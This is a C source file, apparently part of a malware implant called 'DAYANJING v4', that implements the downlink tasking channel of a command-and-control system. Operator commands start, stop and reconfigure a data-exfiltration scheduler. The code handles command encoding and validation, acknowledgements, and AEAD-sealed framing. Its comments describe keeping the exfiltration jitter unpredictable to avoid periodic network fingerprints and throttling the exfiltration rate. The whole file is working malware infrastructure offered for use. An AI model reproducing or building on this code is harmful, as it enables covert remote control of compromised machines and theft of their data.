/*
 * DAYANJING v4 — exfil_task.c
 *
 * C2 下行任务通道实现。设计要点见 include/exfil_task.h 文件头。
 *
 * 本文件不做加密决策：AEAD 完全交给 02_c2 的帧层（c2_frame），
 * 这里只负责"命令的确定性编码 + 合法性校验 + 落到调度器"。
 */

#include "exfil_task.h"

#include <string.h>

#include "c2_frame.h"

/* ---- 小端读写（不依赖主机字节序，也不假设对齐）---- */

static void put_u16(uint8_t *p, uint16_t v)
{
    p[0] = (uint8_t)(v & 0xffu);
    p[1] = (uint8_t)((v >> 8) & 0xffu);
}

static void put_u32(uint8_t *p, uint32_t v)
{
    for (int i = 0; i < 4; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xffu);
}

static void put_u64(uint8_t *p, uint64_t v)
{
    for (int i = 0; i < 8; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xffu);
}

static uint16_t get_u16(const uint8_t *p)
{
    return (uint16_t)((uint16_t)p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t get_u32(const uint8_t *p)
{
    uint32_t v = 0;
    for (int i = 0; i < 4; i++) v |= (uint32_t)p[i] << (8 * i);
    return v;
}

static uint64_t get_u64(const uint8_t *p)
{
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v |= (uint64_t)p[i] << (8 * i);
    return v;
}

/* ---- payload 字段偏移 ---- */

#define CMD_OFF_OPCODE       0
#define CMD_OFF_FLAGS        1
#define CMD_OFF_RSV          2
#define CMD_OFF_TASK_ID      4
#define CMD_OFF_MIN          12
#define CMD_OFF_MAX          20
#define CMD_OFF_BURST        28
#define CMD_OFF_WINDOW       32
#define CMD_OFF_WFRAMES      40
#define CMD_OFF_WBYTES       44
#define CMD_OFF_DEDUP        52
#define CMD_OFF_PAD          53

#define ACK_OFF_OPCODE       0
#define ACK_OFF_STATUS       1
#define ACK_OFF_RSV          2
#define ACK_OFF_TASK_ID      4
#define ACK_OFF_MODE         12
#define ACK_OFF_FRAMES       16
#define ACK_OFF_WFRAMES      20
#define ACK_OFF_WBYTES       24

/* ---- opcode 合法性 ---- */

static int op_known(uint8_t op)
{
    switch (op) {
        case EXF_TASK_OP_START:
        case EXF_TASK_OP_ONCE:
        case EXF_TASK_OP_STOP:
        case EXF_TASK_OP_SET_CFG:
        case EXF_TASK_OP_QUERY:
            return 1;
        default:
            return 0;
    }
}

/* 配置字段是否全零（非 SET_CFG 命令必须全零，保证编码唯一） */
static int cfg_is_zero(const exfil_sched_cfg_t *c)
{
    if (c->min_interval_us   != 0) return 0;
    if (c->max_interval_us   != 0) return 0;
    if (c->burst_max         != 0) return 0;
    if (c->window_us         != 0) return 0;
    if (c->window_max_frames != 0) return 0;
    if (c->window_max_bytes  != 0) return 0;
    if (c->dedup             != 0) return 0;
    return 1;
}

int exfil_task_cfg_ok(const exfil_sched_cfg_t *cfg)
{
    if (!cfg) return 0;

    /* 抖动区间不能倒挂 */
    if (cfg->max_interval_us < cfg->min_interval_us) return 0;

    /*
     * window_us == 0 表示"不设窗口"。此时若配额非零，窗口永不滑动，
     * 配额耗尽后调度器永久卡死（poll 恒 WAIT）。必须拒绝。
     * 这条与 exfil_sched_init 的校验保持一致。
     */
    if (cfg->window_us == 0 &&
        (cfg->window_max_frames != 0 || cfg->window_max_bytes != 0))
        return 0;

    return 1;
}

/* ---- 命令编解码 ---- */

int exfil_task_encode_cmd(const exfil_task_cmd_t *c,
                          uint8_t out[EXF_TASK_CMD_LEN])
{
    if (!c || !out) return EXF_TASK_ERR_ARG;
    if (!op_known(c->opcode)) return EXF_TASK_ERR_FMT;

    /*
     * 编码唯一性：非 SET_CFG 命令不得携带配置。
     * 否则同一语义有多种字节表示，两端实现差异会造成解析分歧。
     */
    if (c->opcode != EXF_TASK_OP_SET_CFG && !cfg_is_zero(&c->cfg))
        return EXF_TASK_ERR_CANON;

    if (c->opcode == EXF_TASK_OP_SET_CFG && !exfil_task_cfg_ok(&c->cfg))
        return EXF_TASK_ERR_CFG;

    memset(out, 0, EXF_TASK_CMD_LEN);
    out[CMD_OFF_OPCODE] = c->opcode;
    /*
     * 保留位显式写 0，而不只依赖 memset：编码唯一性是"写出来"的，
     * 不是"擦出来"的 —— 后续若新增字段，这里会强制作者面对它。
     */
    out[CMD_OFF_FLAGS] = 0;
    put_u16(out + CMD_OFF_RSV, 0);

    put_u64(out + CMD_OFF_TASK_ID, c->task_id);

    if (c->opcode == EXF_TASK_OP_SET_CFG) {
        put_u64(out + CMD_OFF_MIN,     c->cfg.min_interval_us);
        put_u64(out + CMD_OFF_MAX,     c->cfg.max_interval_us);
        put_u32(out + CMD_OFF_BURST,   c->cfg.burst_max);
        put_u64(out + CMD_OFF_WINDOW,  c->cfg.window_us);
        put_u32(out + CMD_OFF_WFRAMES, c->cfg.window_max_frames);
        put_u64(out + CMD_OFF_WBYTES,  c->cfg.window_max_bytes);
        out[CMD_OFF_DEDUP] = c->cfg.dedup ? 1 : 0;
    }

    return EXF_TASK_OK;
}

int exfil_task_decode_cmd(const uint8_t in[EXF_TASK_CMD_LEN],
                          exfil_task_cmd_t *c)
{
    if (!in || !c) return EXF_TASK_ERR_ARG;

    uint8_t op = in[CMD_OFF_OPCODE];
    if (!op_known(op)) return EXF_TASK_ERR_FMT;

    /* canonical：保留位必须为 0 */
    if (in[CMD_OFF_FLAGS] != 0) return EXF_TASK_ERR_CANON;
    if (get_u16(in + CMD_OFF_RSV) != 0) return EXF_TASK_ERR_CANON;
    if (in[CMD_OFF_PAD + 0] != 0 || in[CMD_OFF_PAD + 1] != 0 ||
        in[CMD_OFF_PAD + 2] != 0) return EXF_TASK_ERR_CANON;

    memset(c, 0, sizeof(*c));
    c->opcode  = op;
    c->task_id = get_u64(in + CMD_OFF_TASK_ID);

    if (op == EXF_TASK_OP_SET_CFG) {
        c->cfg.min_interval_us   = get_u64(in + CMD_OFF_MIN);
        c->cfg.max_interval_us   = get_u64(in + CMD_OFF_MAX);
        c->cfg.burst_max         = get_u32(in + CMD_OFF_BURST);
        c->cfg.window_us         = get_u64(in + CMD_OFF_WINDOW);
        c->cfg.window_max_frames = get_u32(in + CMD_OFF_WFRAMES);
        c->cfg.window_max_bytes  = get_u64(in + CMD_OFF_WBYTES);
        c->cfg.dedup             = in[CMD_OFF_DEDUP] ? 1 : 0;

        if (!exfil_task_cfg_ok(&c->cfg)) return EXF_TASK_ERR_CFG;
    } else {
        /* 非 SET_CFG：配置字段必须为 0，否则该字节流不是本协议的产物 */
        exfil_sched_cfg_t tmp;
        memset(&tmp, 0, sizeof(tmp));
        tmp.min_interval_us   = get_u64(in + CMD_OFF_MIN);
        tmp.max_interval_us   = get_u64(in + CMD_OFF_MAX);
        tmp.burst_max         = get_u32(in + CMD_OFF_BURST);
        tmp.window_us         = get_u64(in + CMD_OFF_WINDOW);
        tmp.window_max_frames = get_u32(in + CMD_OFF_WFRAMES);
        tmp.window_max_bytes  = get_u64(in + CMD_OFF_WBYTES);
        tmp.dedup             = in[CMD_OFF_DEDUP] ? 1 : 0;

        if (!cfg_is_zero(&tmp)) return EXF_TASK_ERR_CANON;
    }

    return EXF_TASK_OK;
}

/* ---- 回执编解码 ---- */

int exfil_task_encode_ack(const exfil_task_ack_t *a,
                          uint8_t out[EXF_TASK_ACK_LEN])
{
    if (!a || !out) return EXF_TASK_ERR_ARG;
    if (!op_known(a->opcode)) return EXF_TASK_ERR_FMT;

    memset(out, 0, EXF_TASK_ACK_LEN);
    out[ACK_OFF_OPCODE] = a->opcode;
    out[ACK_OFF_STATUS] = a->status;
    put_u16(out + ACK_OFF_RSV, 0);   /* 显式写 0，同 encode_cmd */
    put_u64(out + ACK_OFF_TASK_ID, a->task_id);
    put_u32(out + ACK_OFF_MODE,    a->mode);
    put_u32(out + ACK_OFF_FRAMES,  (uint32_t)a->frames_sent);
    put_u32(out + ACK_OFF_WFRAMES, a->window_frames);
    put_u64(out + ACK_OFF_WBYTES,  a->window_bytes);
    return EXF_TASK_OK;
}

int exfil_task_decode_ack(const uint8_t in[EXF_TASK_ACK_LEN],
                          exfil_task_ack_t *a)
{
    if (!in || !a) return EXF_TASK_ERR_ARG;

    uint8_t op = in[ACK_OFF_OPCODE];
    if (!op_known(op)) return EXF_TASK_ERR_FMT;
    if (get_u16(in + ACK_OFF_RSV) != 0) return EXF_TASK_ERR_CANON;

    memset(a, 0, sizeof(*a));
    a->opcode        = op;
    a->status        = in[ACK_OFF_STATUS];
    a->task_id       = get_u64(in + ACK_OFF_TASK_ID);
    a->mode          = get_u32(in + ACK_OFF_MODE);
    a->frames_sent   = get_u32(in + ACK_OFF_FRAMES);
    a->window_frames = get_u32(in + ACK_OFF_WFRAMES);
    a->window_bytes  = get_u64(in + ACK_OFF_WBYTES);
    return EXF_TASK_OK;
}

/* ---- 落到调度器 ---- */

int exfil_task_apply(exfil_sched_t *s, const exfil_task_cmd_t *c)
{
    if (!s || !c) return EXF_TASK_ERR_ARG;
    if (!op_known(c->opcode)) return EXF_TASK_ERR_FMT;

    switch (c->opcode) {
        case EXF_TASK_OP_SET_CFG:
            /*
             * 先校验后写入：非法配置若写入会让 poll 恒 WAIT，
             * 表现为"命令成功但再也不采集"的静默故障。
             */
            if (!exfil_task_cfg_ok(&c->cfg)) return EXF_TASK_ERR_CFG;

            /*
             * 只改配置，不动 mode / 窗口 / rng。
             *   窗口不重置 —— 否则高频 SET_CFG 可反复刷新配额，
             *                速率治理形同虚设。
             *   rng  不重置 —— 否则抖动序列可被服务端预测，
             *                重新制造周期指纹。
             */
            s->cfg = c->cfg;
            return EXF_TASK_OK;

        case EXF_TASK_OP_START:
            return exfil_sched_start(s) == EXF_SCHED_OK
                     ? EXF_TASK_OK : EXF_TASK_ERR_ARG;

        case EXF_TASK_OP_ONCE:
            return exfil_sched_once(s) == EXF_SCHED_OK
                     ? EXF_TASK_OK : EXF_TASK_ERR_ARG;

        case EXF_TASK_OP_STOP:
            exfil_sched_stop(s);
            return EXF_TASK_OK;

        case EXF_TASK_OP_QUERY:
            /* 不改任何状态，仅用于拉回执 */
            return EXF_TASK_OK;

        default:
            return EXF_TASK_ERR_FMT;
    }
}

int exfil_task_fill_ack(const exfil_sched_t *s,
                        const exfil_task_cmd_t *c,
                        uint8_t status,
                        exfil_task_ack_t *a)
{
    if (!s || !c || !a) return EXF_TASK_ERR_ARG;
    if (!op_known(c->opcode)) return EXF_TASK_ERR_FMT;

    memset(a, 0, sizeof(*a));
    a->opcode  = c->opcode;
    a->status  = status;
    a->task_id = c->task_id;
    a->mode    = (uint32_t)s->mode;
    a->frames_sent = (uint32_t)s->frames_sent;

    {
        uint32_t wf = 0;
        uint64_t wb = 0;
        exfil_sched_usage(s, &wf, &wb);
        a->window_frames = wf;
        a->window_bytes  = wb;
    }
    return EXF_TASK_OK;
}

/* ---- 走 02_c2 帧层 AEAD ---- */

int exfil_task_seal_cmd(const uint8_t key[16], const uint8_t pfx[8],
                        uint32_t counter, uint64_t seq,
                        const exfil_task_cmd_t *c,
                        uint8_t *out, size_t cap, size_t *out_len)
{
    uint8_t pl[EXF_TASK_CMD_LEN];
    int r;

    if (!key || !pfx || !c) return EXF_TASK_ERR_ARG;

    r = exfil_task_encode_cmd(c, pl);
    if (r != EXF_TASK_OK) return r;

    r = c2_frame_seal(key, pfx, counter, seq, EXF_MSG_TASK,
                      pl, EXF_TASK_CMD_LEN, out, cap, out_len);
    if (r == C2_FRAME_ERR_AUTH) return EXF_TASK_ERR_AUTH;
    if (r == C2_FRAME_ERR_LEN)  return EXF_TASK_ERR_LEN;
    if (r != C2_FRAME_OK)       return EXF_TASK_ERR_ARG;
    return EXF_TASK_OK;
}

int exfil_task_open_cmd(const uint8_t key[16],
                        const uint8_t *wire, size_t wire_len,
                        uint64_t *seq, exfil_task_cmd_t *c)
{
    uint8_t pl[EXF_TASK_CMD_LEN];
    uint32_t mt = 0;
    uint64_t s  = 0;
    size_t   plen = 0;
    int r;

    if (!key || !wire || !c) return EXF_TASK_ERR_ARG;

    r = c2_frame_open(key, wire, wire_len, &s, &mt,
                      pl, sizeof(pl), &plen);
    if (r == C2_FRAME_ERR_AUTH) return EXF_TASK_ERR_AUTH;
    if (r == C2_FRAME_ERR_LEN)  return EXF_TASK_ERR_LEN;
    if (r != C2_FRAME_OK)       return EXF_TASK_ERR_FMT;

    if (mt != EXF_MSG_TASK)      return EXF_TASK_ERR_FMT;
    if (plen != EXF_TASK_CMD_LEN) return EXF_TASK_ERR_FMT;

    r = exfil_task_decode_cmd(pl, c);
    if (r != EXF_TASK_OK) return r;

    if (seq) *seq = s;
    return EXF_TASK_OK;
}

int exfil_task_seal_ack(const uint8_t key[16], const uint8_t pfx[8],
                        uint32_t counter, uint64_t seq,
                        const exfil_task_ack_t *a,
                        uint8_t *out, size_t cap, size_t *out_len)
{
    uint8_t pl[EXF_TASK_ACK_LEN];
    int r;

    if (!key || !pfx || !a) return EXF_TASK_ERR_ARG;

    r = exfil_task_encode_ack(a, pl);
    if (r != EXF_TASK_OK) return r;

    r = c2_frame_seal(key, pfx, counter, seq, EXF_MSG_TASK_ACK,
                      pl, EXF_TASK_ACK_LEN, out, cap, out_len);
    if (r == C2_FRAME_ERR_AUTH) return EXF_TASK_ERR_AUTH;
    if (r == C2_FRAME_ERR_LEN)  return EXF_TASK_ERR_LEN;
    if (r != C2_FRAME_OK)       return EXF_TASK_ERR_ARG;
    return EXF_TASK_OK;
}

int exfil_task_open_ack(const uint8_t key[16],
                        const uint8_t *wire, size_t wire_len,
                        uint64_t *seq, exfil_task_ack_t *a)
{
    uint8_t pl[EXF_TASK_ACK_LEN];
    uint32_t mt = 0;
    uint64_t s  = 0;
    size_t   plen = 0;
    int r;

    if (!key || !wire || !a) return EXF_TASK_ERR_ARG;

    r = c2_frame_open(key, wire, wire_len, &s, &mt,
                      pl, sizeof(pl), &plen);
    if (r == C2_FRAME_ERR_AUTH) return EXF_TASK_ERR_AUTH;
    if (r == C2_FRAME_ERR_LEN)  return EXF_TASK_ERR_LEN;
    if (r != C2_FRAME_OK)       return EXF_TASK_ERR_FMT;

    if (mt != EXF_MSG_TASK_ACK)  return EXF_TASK_ERR_FMT;
    if (plen != EXF_TASK_ACK_LEN) return EXF_TASK_ERR_FMT;

    r = exfil_task_decode_ack(pl, a);
    if (r != EXF_TASK_OK) return r;

    if (seq) *seq = s;
    return EXF_TASK_OK;
}

/* ---- 字符串 ---- */

const char *exfil_task_errstr(int e)
{
    switch (e) {
        case EXF_TASK_OK:          return "ok";
        case EXF_TASK_ERR_ARG:     return "invalid argument";
        case EXF_TASK_ERR_LEN:     return "invalid length / buffer too small";
        case EXF_TASK_ERR_FMT:     return "format error";
        case EXF_TASK_ERR_CANON:   return "non-canonical encoding";
        case EXF_TASK_ERR_CFG:     return "invalid schedule config";
        case EXF_TASK_ERR_AUTH:    return "AEAD authentication failed";
        default:                   return "unknown";
    }
}

const char *exfil_task_opstr(uint8_t op)
{
    switch (op) {
        case EXF_TASK_OP_START:   return "START";
        case EXF_TASK_OP_ONCE:    return "ONCE";
        case EXF_TASK_OP_STOP:    return "STOP";
        case EXF_TASK_OP_SET_CFG: return "SET_CFG";
        case EXF_TASK_OP_QUERY:   return "QUERY";
        default:                  return "UNKNOWN";
    }
}
